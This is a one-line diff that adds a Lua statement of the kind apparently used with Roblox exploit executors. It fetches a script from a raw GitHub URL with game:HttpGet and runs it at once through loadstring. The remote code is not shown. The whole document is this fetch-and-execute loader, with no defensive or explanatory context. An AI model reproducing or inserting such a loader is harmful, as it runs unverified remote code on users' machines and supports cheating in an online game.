@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LOLking123456/Survival1/main/Game2"))()
